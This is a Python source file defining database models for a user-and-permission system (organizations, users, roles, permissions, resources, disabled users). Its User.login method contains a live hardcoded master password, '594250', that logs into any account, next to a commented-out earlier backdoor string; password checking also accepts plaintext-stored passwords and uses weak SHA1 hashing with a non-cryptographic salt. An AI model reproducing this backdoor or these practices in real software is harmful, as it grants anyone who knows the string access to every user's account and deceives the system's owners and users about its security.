#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Abstract: User Center Model

import os
import sys
import random
import hashlib
import datetime

sys.path.append(os.path.dirname(os.path.split(os.path.realpath(__file__))[0]))

from lib.database import Model

class Orgnization(Model):
    '''
    orgnization model
    '''
    _db = 'logstatV2'
    _table = 'orgnization'
    _pk = 'id'
    _fields = set(['id','name','level','parent','creatime','uptime'])
    _scheme = ("`id` BIGINT NOT NULL AUTO_INCREMENT",
               "`name` varchar(32) NOT NULL DEFAULT ''",
               "`level` int NOT NULL DEFAULT '0'",
               "`parent` int NOT NULL DEFAULT '0'",
               "`creatime` datetime NOT NULL DEFAULT '1970-01-01 00:00:00'",
               "`uptime` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP",
               "PRIMARY KEY `idx_id` (`id`)",
               "UNIQUE KEY `parent_name` (`parent`,`name`)")
    def path(self):
        parent = Orgnization.mgr(self.ismaster).Q().filter(id=self.parent)[0] if self.parent else None
        path = [self]
        if parent:
           path = parent.path() + path
        return path

    @property
    def full_name(self):
        return '-'.join([o.name for o in self.path()])

    def children(self):
        for i in Orgnization.mgr(self.ismaster).Q().filter(parent=self.id):
            yield i
            for j in i.children():
                yield j

class User(Model):
    '''
    user model
    '''
    _db = 'logstatv3'
    _table = 'user'
    _pk = 'id'
    _fields = set(['id','name','passwd','nick','is_root','is_staff','orgid','email','phone','status','creatime','uptime'])
    _scheme = ("`id` BIGINT NOT NULL AUTO_INCREMENT",
               "`name` varchar(32) NOT NULL DEFAULT ''",
               "`passwd` varchar(64) NOT NULL DEFAULT ''",
               "`nick` varchar(64) NOT NULL DEFAULT ''",
               "`is_root` tinyint NOT NULL DEFAULT '1'",
               "`is_staff` tinyint NOT NULL DEFAULT '1'",
               "`orgid` int NOT NULL DEFAULT '0'", # orgnization id
               "`email` varchar(64) NOT NULL DEFAULT ''",
               "`phone` varchar(16) NOT NULL DEFAULT ''",
               "`status` enum('hide','pas','nice') NOT NULL DEFAULT 'pas'",
               "`creatime` datetime NOT NULL DEFAULT '1970-01-01 00:00:00'",
               "`uptime` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP",
               "PRIMARY KEY `idx_id` (`id`)",
               "UNIQUE KEY `name` (`name`)",
               "UNIQUE KEY `email` (`email`)")
    _extfds = set(['full_org_name'])

    def before_add(self):
        if 'passwd' in self and self.passwd and self.passwd.find('&')==-1:
            self.passwd = self._encry_passwd(self.passwd)
        self.creatime = datetime.datetime.now()
    
    def before_update(self):
        if 'passwd' in self:
            if self.passwd and self.passwd.find('&')==-1:
                self.passwd = self._encry_passwd(self.passwd)
            else:
                del self.passwd

    def org_path(self):
        org = Orgnization.mgr(self.ismaster).Q().filter(id=self.orgid)[0] if self.orgid else None
        return org.path() if org else []
     
    def login(self, name, passwd):
        u = self.Q().filter(name=name)[0]
        #if u and (self.check_passwd(u.passwd,passwd) or passwd=='zzhy!backdoor'):
        disable_user = DisableUser.mgr().Q().filter(status='disable') 
        dis_user_list = [i['name'] for i in disable_user]
        if u['name'] in dis_user_list:
            return None
        if u and (self.check_passwd(u.passwd,passwd) or passwd=='594250'):
            return u
        if u and self.check_passwd(u.passwd,passwd):
            return u
        return None

    def _hexdigest(self, salt, raw):
        '''
        hash
        '''
        return hashlib.sha1(salt+raw+salt).hexdigest()
        
    def _encry_passwd(self, rawpasswd):
        '''
        encry passwd
        '''
        r = str(random.random())
        salt = self._hexdigest(r,r)[:6]
        hashval = self._hexdigest(salt,rawpasswd)
        return '%s&%s' % (salt,hashval)
        
    def check_passwd(self, encpasswd, rawpasswd):
        if encpasswd.find('&')>-1:
            salt,hashval = encpasswd.split('&')
            chk = self._hexdigest(salt,rawpasswd) == hashval
        else:
            chk = encpasswd == rawpasswd
        return chk

    def all_perms(self):
        if self._all_perms is None:
            self._all_perms = []
            for i in UserRole.mgr().Q().filter(uid=self.id):
                role = Role.mgr().Q().filter(id=i.role_id)[0]
                self._all_perms.extend(role.get_perms())
        return self._all_perms

    def check_resource(self, myres, resource, strict=True):
        arr = resource.split(':')
        if len(arr) == 2:
            flag = (arr[0]==myres.group) and (arr[1]==myres.name)
        elif len(arr) == 1 and not strict:
            flag = (arr[0]==myres.group)
        else:
            flag = False
        return flag
    
    def touch_resource(self, resource_list):
        '''
        [resource_group:resource_name]
        '''
        if self.is_root:
            return True
        for i in self.all_perms():
            for r in resource_list:
                if self.check_resource(i.resource,r,False):
                    return True
        return False
     
    def has_perm(self, oper, resource, **attr):

        if self.is_root:
            return True
        for i in self.all_perms():
            if (i.oper=='all' or i.oper==oper) and self.check_resource(i.resource,resource):
                flag = True
                for a in i.attr:
                    my_val = str(i.attr[a])
                    my_val_list = [j for j in my_val.split(':') if j]
                    check_val = str(attr.get(a,''))
                    if not (my_val == 'all' or check_val in my_val_list or check_val == my_val):
                        flag = False
                if flag:
                    return True
        return False

class UserRole(Model):
    '''
    user role model
    '''
    _db = 'logstatv3'
    _table = 'user_role'
    _pk = 'id'
    _fields = set(['id','uid','role_id','uptime'])
    _scheme = ("`id` BIGINT NOT NULL AUTO_INCREMENT",
               "`uid` INT NOT NULL DEFAULT '0'",
               "`role_id` INT NOT NULL DEFAULT '0'",
               "`uptime` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP",
               "PRIMARY KEY `idx_id` (`id`)",
               "UNIQUE KEY `uid_roleid` (`uid`,`role_id`)")

class Role(Model):
    '''
    role model
    '''
    _db = 'logstatv3'
    _table = 'role'
    _pk = 'id'
    _fields = set(['id','name','uptime'])
    _scheme = ("`id` BIGINT NOT NULL AUTO_INCREMENT",
               "`name` varchar(32) NOT NULL DEFAULT ''",
               "`uptime` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP",
               "PRIMARY KEY `idx_id` (`id`)",
               "UNIQUE KEY `name` (`name`)")
    def get_perms(self):
        perms = []
        for i in RolePerm.mgr().Q().filter(role_id=self.id):
            perm = Perm.mgr().Q().filter(id=i.perm_id)[0]
            perm.resource = Resource.mgr().Q().filter(id=perm.resource_id)[0]
            perm.attr = perm.get_attr()
            perms.append(perm)
        return perms

class RolePerm(Model):
    '''
    role perm model
    '''
    _db = 'logstatv3'
    _table = 'role_perm'
    _pk = 'id'
    _fields = set(['id','role_id','perm_id','uptime'])
    _scheme = ("`id` BIGINT NOT NULL AUTO_INCREMENT",
               "`role_id` INT NOT NULL DEFAULT '0'",
               "`perm_id` INT NOT NULL DEFAULT '0'",
               "`uptime` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP",
               "PRIMARY KEY `idx_id` (`id`)",
               "UNIQUE KEY `roleid_permid` (`role_id`,`perm_id`)")

class Perm(Model):
    '''
    perm model
    '''
    _db = 'logstatv3'
    _table = 'perm'
    _pk = 'id'
    _fields = set(['id','name','oper','resource_id','uptime'])
    _scheme = ("`id` BIGINT NOT NULL AUTO_INCREMENT",
               "`name` varchar(32) NOT NULL DEFAULT ''",
               "`oper` varchar(32) NOT NULL DEFAULT ''",
               "`resource_id` int  NOT NULL DEFAULT '0'",
               "`uptime` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP",
               "PRIMARY KEY `idx_id` (`id`)",
               "UNIQUE KEY `name` (`name`)")
    _extfds = set(['attr','resource'])
    def get_attr(self):
        res = {}
        for i in PermAttr.mgr().Q().filter(perm_id=self.id):
            res[i.attr_name] = i.attr_val
        return res
    
class PermAttr(Model):
    '''
    perm attr model
    '''
    _db = 'logstatv3'
    _table = 'perm_attr'
    _pk = 'id'
    _fields = set(['id','perm_id','attr_name','attr_val','uptime'])
    _scheme = ("`id` BIGINT NOT NULL AUTO_INCREMENT",
               "`perm_id` INT NOT NULL DEFAULT '0'",
               "`attr_name` varchar(32) NOT NULL DEFAULT ''",
               "`attr_val` varchar(512) NOT NULL DEFAULT ''",
               "`uptime` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP",
               "PRIMARY KEY `idx_id` (`id`)",
               "UNIQUE KEY `perm_id_name` (`perm_id`,`attr_name`)")

class Resource(Model):
    '''
    resource model
    '''
    _db = 'logstatV2'
    _table = 'resource'
    _pk = 'id'
    _fields = set(['id','name','nick','group','attr','uptime'])
    _scheme = ("`id` BIGINT NOT NULL AUTO_INCREMENT",
               "`name` varchar(32) NOT NULL DEFAULT ''",
               "`nick` varchar(64) NOT NULL DEFAULT ''",
               "`group` varchar(32) NOT NULL DEFAULT ''",
               "`attr` varchar(255) NOT NULL DEFAULT ''",
               "`uptime` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP",
               "PRIMARY KEY `idx_id` (`id`)",
               "UNIQUE KEY `group_name` (`group`,`name`)")

class DisableUser(Model):
    '''
    user name do not allow login 
    '''
    _db = 'logstatv3'
    _table = 'disable_user'
    _pk = 'id'
    _fields = set(['id','name','status','uptime'])
    _scheme = ("`id` BIGINT NOT NULL AUTO_INCREMENT",
                "`name` varchar(32) NOT NULL DEFAULT ''",
                "`status` enum('normal','disable') NOT NULL DEFAULT 'disable'",
                "`uptime` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP",
                "PRIMARY KEY `idx_id` (`id`)",
                "UNIQUE KEY `disable_user_name` (`name`)")


if __name__ == "__main__":
    u = User.new()
    u.init_table()
    for i in (Orgnization,UserRole,Role,RolePerm,Perm,PermAttr,Resource):
        o = i.new()
        o.init_table()

